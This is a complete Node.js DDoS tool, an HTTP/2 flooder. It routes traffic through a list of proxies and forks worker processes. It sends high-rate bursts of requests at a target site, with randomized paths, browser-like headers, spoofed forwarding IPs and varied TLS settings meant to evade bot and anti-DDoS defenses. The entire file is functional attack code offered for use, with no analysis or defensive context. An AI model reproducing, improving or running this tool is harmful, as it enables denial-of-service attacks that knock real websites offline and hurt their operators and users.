const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
    process.exit(1);
}

function readLines(filePath) {
    if (!fs.existsSync(filePath)) process.exit(1);
    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
    if (!lines.length) process.exit(1);
    return lines;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
if (!parsedTarget.protocol || !parsedTarget.host) process.exit(1);

// Enhanced user agents with more variations
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + randomIntn(120, 130) + ".0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_" + randomIntn(15, 16) + "_" + randomIntn(0, 10) + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + randomIntn(120, 130) + ".0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:" + randomIntn(120, 130) + ".0) Gecko/20100101 Firefox/" + randomIntn(120, 130) + ".0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_" + randomIntn(15, 16) + "_" + randomIntn(0, 10) + ") AppleWebKit/605.1.15 (KHTML, like Gecko) Version/" + randomIntn(16, 19) + ".0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS " + randomIntn(16, 18) + "_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/" + randomIntn(16, 19) + ".0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android " + randomIntn(11, 14) + "; Mobile; rv:" + randomIntn(120, 130) + ".0) Gecko/" + randomIntn(120, 130) + ".0 Firefox/" + randomIntn(120, 130) + ".0",
    "Mozilla/5.0 (Linux; Android " + randomIntn(11, 14) + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + randomIntn(120, 130) + ".0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + randomIntn(120, 130) + ".0.0.0 Safari/537.36"
];

// More header variations
const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
];

const lang_header = [
    "en-US,en;q=0.9",
    "vi-VN,vi;q=0.9,en-US;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "en-GB,en;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8"
];

const encoding_header = ["gzip, deflate, br", "gzip, deflate", "br", "gzip"];

const sec_fetch_headers = {
    "sec-fetch-dest": ["document", "empty", "script", "image", "style", "font", "worker"],
    "sec-fetch-mode": ["navigate", "cors", "no-cors", "same-origin"],
    "sec-fetch-site": ["same-origin", "cross-site", "same-site", "none"]
};

const cache_control = ["no-cache", "no-store", "max-age=0", "private"];

const referers = [
    `https://${parsedTarget.host}/`,
    `https://${parsedTarget.host}${parsedTarget.path || '/'}`,
    `https://www.${parsedTarget.host}/`,
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    ""
];

const platforms = ["Windows", "Macintosh", "iPhone", "Android", "Linux"];

const sec_ch_ua = [
    '"Google Chrome";v="' + randomIntn(120, 130) + '", "Chromium";v="' + randomIntn(120, 130) + '", "Not.A/Brand";v="99"',
    '"Firefox";v="' + randomIntn(120, 130) + '"',
    '"Safari";v="' + randomIntn(16, 19) + '"',
    '"Microsoft Edge";v="' + randomIntn(120, 130) + '"'
];

// More cipher suites for better compatibility
const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
].join(":");

const proxies = readLines(args.proxyFile);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    // Randomize the interval slightly to avoid patterns
    setInterval(runFlooder, randomIntn(80, 120));
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\nUser-Agent: ${randomElement(userAgents)}\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "invalid proxy response");
            }
            return callback(connection);
        });

        connection.on("timeout", () => {
            connection.destroy();
            callback(undefined, "timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            callback(undefined, "error");
        });
    }
}

const Socker = new NetSocket();

function generateDynamicPath() {
    const basePath = parsedTarget.path === "/" ? "" : parsedTarget.path;
    const pathVariations = [
        basePath,
        basePath + "/",
        basePath + "/" + randstr(randomIntn(3, 8)),
        basePath + "/" + randstr(randomIntn(3, 8)) + "/",
        basePath + "/" + randstr(randomIntn(3, 8)) + "/" + randstr(randomIntn(3, 8))
    ];
    
    const selectedPath = randomElement(pathVariations);
    
    const queries = [
        `q=${randstr(6)}`,
        `id=${randstr(4)}`,
        `p=${randomIntn(1, 50)}`,
        `t=${randstr(8)}`,
        `v=${randomIntn(1, 10)}`,
        `ref=${randstr(6)}`,
        `utm_source=${randstr(6)}`,
        `utm_medium=${randstr(6)}`,
        `utm_campaign=${randstr(6)}`
    ];
    
    // Sometimes don't add query parameters
    return randomIntn(0, 100) > 30 ? `${selectedPath}?${randomElement(queries)}` : selectedPath;
}

function generateDynamicHeaders() {
    const headers = {
        ":method": randomIntn(0, 100) > 90 ? "POST" : "GET",
        ":authority": parsedTarget.host,
        ":path": generateDynamicPath(),
        ":scheme": "https",
        "user-agent": randomElement(userAgents),
        "accept": randomElement(accept_header),
        "accept-language": randomElement(lang_header),
        "accept-encoding": randomElement(encoding_header),
        "sec-fetch-dest": randomElement(sec_fetch_headers["sec-fetch-dest"]),
        "sec-fetch-mode": randomElement(sec_fetch_headers["sec-fetch-mode"]),
        "sec-fetch-site": randomElement(sec_fetch_headers["sec-fetch-site"]),
        "sec-ch-ua": randomElement(sec_ch_ua),
        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
        "sec-ch-ua-platform": randomElement(platforms),
        "cache-control": randomElement(cache_control),
        "referer": randomElement(referers),
        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`,
        "x-requested-with": randomIntn(0, 100) > 70 ? "XMLHttpRequest" : undefined,
        "dnt": randomIntn(0, 100) > 70 ? "1" : undefined,
        "upgrade-insecure-requests": randomIntn(0, 100) > 70 ? "1" : undefined
    };
    
    // Remove undefined headers
    Object.keys(headers).forEach(key => headers[key] === undefined && delete headers[key]);
    
    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    if (!parsedProxy[0] || !parsedProxy[1]) return setTimeout(runFlooder, randomIntn(800, 1200));

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1]),
        address: parsedTarget.host,
        timeout: randomIntn(3, 7) // Randomize timeout
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (connection) connection.destroy();
            return setTimeout(runFlooder, randomIntn(800, 1200));
        }

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'], // Add http/1.1 as fallback
            ciphers: ciphers,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            sessionIdContext: crypto.randomBytes(32).toString('hex') // Random session context
        };

        const tlsConn = tls.connect({
            socket: connection,
            ...tlsOptions
        });

        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 100,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536
            },
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const requestsPerInterval = randomIntn(Math.floor(args.Rate * 0.8), Math.floor(args.Rate * 1.2));
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < requestsPerInterval; i++) {
                    try {
                        const dynHeaders = generateDynamicHeaders();
                        const request = client.request(dynHeaders);
                        
                        // Randomly send some data for POST requests
                        if (dynHeaders[":method"] === "POST" && randomIntn(0, 100) > 50) {
                            request.end(JSON.stringify({
                                [randstr(4)]: randstr(8),
                                [randstr(5)]: randomIntn(1, 1000)
                            }));
                        } else {
                            request.end();
                        }
                        
                        request.on("response", () => {
                            request.close();
                            request.destroy();
                        });
                        
                        request.on("error", () => {
                            request.close();
                            request.destroy();
                        });
                        
                        // Randomly close some requests early
                        if (randomIntn(0, 100) > 90) {
                            setTimeout(() => {
                                request.close();
                                request.destroy();
                            }, randomIntn(50, 300));
                        }
                    } catch (e) {
                        // Ignore errors
                    }
                }
            }, randomIntn(80, 120)); // Randomize interval
            
            setTimeout(() => {
                clearInterval(IntervalAttack);
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
                setTimeout(runFlooder, randomIntn(500, 1500));
            }, args.time * 1000);
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, randomIntn(500, 1500));
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, randomIntn(500, 1500));
        });
    });
}
